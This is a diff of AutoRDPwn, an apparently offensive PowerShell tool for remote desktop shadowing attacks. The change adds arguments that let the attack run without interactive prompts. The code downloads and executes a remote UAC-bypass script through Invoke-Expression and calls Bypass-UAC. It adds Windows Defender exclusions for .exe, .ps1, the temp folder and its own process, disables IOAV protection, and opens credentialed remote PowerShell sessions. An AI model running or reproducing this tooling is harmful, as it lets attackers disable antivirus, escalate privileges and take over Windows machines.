@@ -1,6 +1,5 @@
 ﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
-$noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] 
-Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/AutoBypass.ps1')
+$noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] ; $option=$args[4] ; $shadowoption=$args[6] ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/AutoBypass.ps1')
 if($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" ; exit }}
 (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/AutoRDPwn.ico","$pwd\AutoRDPwn.ico") ; (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Set-ConsoleIcon.ps1","$pwd\Set-ConsoleIcon.ps1") ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
 $Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
@@ -77,8 +76,10 @@ function Remove-Exclusions {
     $exclusion = Get-MpPreference ; $exclusion.exclusionextension | % { Remove-MpPreference -ExclusionExtension $_ 2>&1> $null }
     Set-MpPreference -DisableIOAVProtection 0 2>&1> $null ; Clear-Item -Path WSMan:localhostClientTrustedHosts -Force 2>&1> $null } 
 
-    if($nogui -like '-nogui') { $null } else { do { Show-Banner ; Show-Language
-    $system = (Get-WmiObject Win32_OperatingSystem).OSArchitecture ; $help = "The detailed guide of use can be found at the following link:"
+    $system = (Get-WmiObject Win32_OperatingSystem).OSArchitecture ; if($nogui -like '-nogui') { $null } else {     
+    $help = "The detailed guide of use can be found at the following link:"
+
+    do { Show-Banner ; Show-Language
     $Random = New-Object System.Random ; "Choose your language:` " -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine()
     switch ($input) {
@@ -101,7 +102,8 @@ function Remove-Exclusions {
     else { Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null; Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null
     Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null }
 
-    do { Show-Banner ; Show-Menu  
+    do { Show-Banner ; Show-Menu
+    if($option -like '-option') { $input=$args[5] ; $computer='localhost' ; $user=$currentuser ; break }
     $Random = New-Object System.Random ; $txt7 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' ; $currentuser = [Environment]::username ; $input = $Host.UI.ReadLine() ; switch ($input) {
 
@@ -410,8 +412,8 @@ function Remove-Exclusions {
    if(!$user) { $RDP = New-PSSession -Computer $computer } ; if($user) { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) 
    $RDP = New-PSSession -Computer $computer -credential $credential } ; $session = get-pssession ; if ($session){
 
-        do { $Host.UI.RawUI.ForegroundColor = 'Green'
-	if ($stickykeys){ $input = "control" } else { Write-Host ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $input = $Host.UI.ReadLine() }
+        do { $Host.UI.RawUI.ForegroundColor = 'Green' ; if ($stickykeys){ $input = "control" ; break } ; if($shadowoption -like '-shadow') { $input=$args[7] ; break }
+	Write-Host ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $input = $Host.UI.ReadLine()
         switch -wildcard ($input) {
 
         'ver' { $control = "false" ; Write-Host
